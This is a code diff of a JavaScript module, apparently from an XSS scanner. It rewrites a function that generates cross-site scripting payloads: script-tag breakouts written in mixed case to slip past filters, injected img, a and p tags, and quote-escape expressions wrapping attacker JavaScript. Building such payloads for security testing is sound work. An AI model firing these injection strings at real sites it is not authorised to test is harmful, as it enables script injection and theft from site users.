@@ -1,36 +1,20 @@
-function scriptPayloads({jsCode, scriptTag, imgTag, aTag, pTag, tagTrigger, assert}) {
-    return [{
-        payload: ` ${jsCode} `,
-        assert,
-    }, {
-        payload: `</ScRiPt>${scriptTag}`,
-        assert,
-    }, {
-        payload: `</ScRiPt>${imgTag}`,
-        assert,
-    }, {
-        payload: `</ScRiPt>${aTag}`,
-        trigger: tagTrigger,
-        assert,
-    }, {
-        payload: `</ScRiPt>${pTag}`,
-        trigger: tagTrigger,
-        assert,
-    }, {
-        payload: `</ScRiPt>${scriptTag}<ScrIPt>`,
-        assert,
-    }, {
-        payload: `</ScRiPt>${imgTag}<ScrIPt>`,
-        assert,
-    }, {
-        payload: `</ScRiPt>${aTag}<ScrIPt>`,
-        trigger: tagTrigger,
-        assert,
-    }, {
-        payload: `</ScRiPt>${pTag}<ScrIPt>`,
-        trigger: tagTrigger,
-        assert,
-    },];
+function scriptPayloads({reflection, jsCode, tagClass, htmlElements}) {
+    const exitStrings = ['"', "'", '`'];
+    return [
+        {
+            payload: `;${jsCode};`,
+        },
+        {
+            payload: ` ${jsCode} `,
+        },
+        ...exitStrings.map(exit=>({
+            payload: `${exit}-(${jsCode})-${exit}`,
+        })),
+        ...htmlElements.map(({tag, trigger}) => ({
+            payload: `</ScRiPt>${tag}`,
+            trigger,
+        })),
+    ];
 }
 
 module.exports = scriptPayloads;
